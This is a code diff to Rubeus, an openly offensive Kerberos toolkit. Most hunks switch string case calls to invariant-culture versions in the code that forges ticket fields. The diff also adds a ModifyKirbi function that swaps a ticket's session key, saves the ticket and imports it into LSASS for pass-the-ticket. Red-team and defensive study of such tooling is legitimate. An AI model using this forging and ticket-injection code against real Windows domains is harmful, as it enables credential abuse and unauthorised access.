@@ -187,7 +187,7 @@ namespace Rubeus
             }
             if (String.IsNullOrEmpty(netbiosName))
             {
-                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf('.')).ToUpper());
+                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf('.')).ToUpperInvariant());
             }
 
             // if /ldap was passed make the LDAP queries
@@ -766,7 +766,7 @@ namespace Rubeus
 
             // output some ticket information relevent to all tickets generated
             Console.WriteLine("");
-            Console.WriteLine("[*] Domain         : {0} ({1})", domain.ToUpper(), kvi.LogonDomainName);
+            Console.WriteLine("[*] Domain         : {0} ({1})", domain.ToUpperInvariant(), kvi.LogonDomainName);
             Console.WriteLine("[*] SID            : {0}", kvi.LogonDomainId?.GetValue());
             Console.WriteLine("[*] UserId         : {0}", kvi.UserId);
             if (kvi.GroupCount > 0)
@@ -799,14 +799,14 @@ namespace Rubeus
 
                 ClientName cn = null;
                 if (parts[0].Equals("krbtgt") && !cRealm.Equals(domain))
-                    cn = new ClientName((DateTime)startTime, String.Format("{0}@{1}@{1}", user, domain.ToUpper()));
+                    cn = new ClientName((DateTime)startTime, String.Format("{0}@{1}@{1}", user, domain.ToUpperInvariant()));
                 else
                     cn = new ClientName((DateTime)startTime, user);
 
-                UpnDns upnDns = new UpnDns(upnFlags, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
+                UpnDns upnDns = new UpnDns(upnFlags, domain.ToUpperInvariant(), String.Format("{0}@{1}", user, domain.ToLowerInvariant()));
                 if (extendedUpnDns)
                 {
-                    upnDns = new UpnDns(upnFlags + 2, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()), user, new SecurityIdentifier(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId)));
+                    upnDns = new UpnDns(upnFlags + 2, domain.ToUpperInvariant(), String.Format("{0}@{1}", user, domain.ToLowerInvariant()), user, new SecurityIdentifier(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId)));
                 }
 
                 S4UDelegationInfo s4u = null;
@@ -817,7 +817,7 @@ namespace Rubeus
 
                 Console.WriteLine("[*] Generating EncTicketPart");
 
-                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpper(), cName, flags, cn.ClientId);
+                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpperInvariant(), cName, flags, cn.ClientId);
 
                 // set other times in EncTicketPart
                 DateTime? check = null;
@@ -971,7 +971,7 @@ namespace Rubeus
 
                 // initialize the ticket and add the enc_part
                 Console.WriteLine("[*] Generating Ticket");
-                Ticket ticket = new Ticket(domain.ToUpper(), sname);
+                Ticket ticket = new Ticket(domain.ToUpperInvariant(), sname);
                 // when performing keylist attack the kvnum is shifted left 16 bits
                 if (rodcNumber == 0)
                 {
@@ -1345,7 +1345,7 @@ namespace Rubeus
                                 sid = new SecurityIdentifier(String.Format("{0}-{1}", sid.Value.Substring(0, sid.Value.LastIndexOf('-')), ticketUserId));
                             }
                         }
-                        upnDns = new UpnDns((int)upnDns.Flags,upnDns.DnsDomainName,string.Format("{0}@{1}", ticketUser, upnDns.DnsDomainName.ToLower()), samName, sid);
+                        upnDns = new UpnDns((int)upnDns.Flags,upnDns.DnsDomainName,string.Format("{0}@{1}", ticketUser, upnDns.DnsDomainName.ToLowerInvariant()), samName, sid);
 
                     }
                 }
@@ -1491,6 +1491,57 @@ namespace Rubeus
             }
 
             return kirbiBytes;
+        }
+
+        public static void ModifyKirbi(KRB_CRED kirbi, byte[] sessionKey = null, Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1, bool ptt = false, LUID luid = new LUID(), string outfile = "")
+        {
+            if (sessionKey != null)
+            {
+                kirbi.enc_part.ticket_info[0].key = new EncryptionKey();
+                kirbi.enc_part.ticket_info[0].key.keyvalue = sessionKey;
+                kirbi.enc_part.ticket_info[0].key.keytype = (int)sessionKeyEtype;
+            }
+
+            byte[] kirbiBytes = kirbi.Encode().Encode();
+
+            string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+            Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
+
+            if (Program.wrapTickets)
+            {
+                // display the .kirbi base64, columns of 80 chararacters
+                foreach (string line in Helpers.Split(kirbiString, 80))
+                {
+                    Console.WriteLine("      {0}", line);
+                }
+            }
+            else
+            {
+                Console.WriteLine("      {0}", kirbiString);
+            }
+
+            Console.WriteLine("");
+
+            if (!String.IsNullOrEmpty(outfile))
+            {
+                KrbCredInfo info = kirbi.enc_part.ticket_info[0];
+                DateTime fileTime = (DateTime)info.starttime;
+                string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{fileTime.ToString("yyyy_MM_dd_HH_mm_ss")}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
+                filename = Helpers.MakeValidFileName(filename);
+                if (Helpers.WriteBytesToFile(filename, kirbiBytes))
+                {
+                    Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
+                }
+            }
+
+            Console.WriteLine("");
+
+            if (ptt || ((ulong)luid != 0))
+            {
+                // pass-the-ticket -> import into LSASS
+                LSA.ImportTicket(kirbiBytes, luid);
+            }
         }
     }
 }
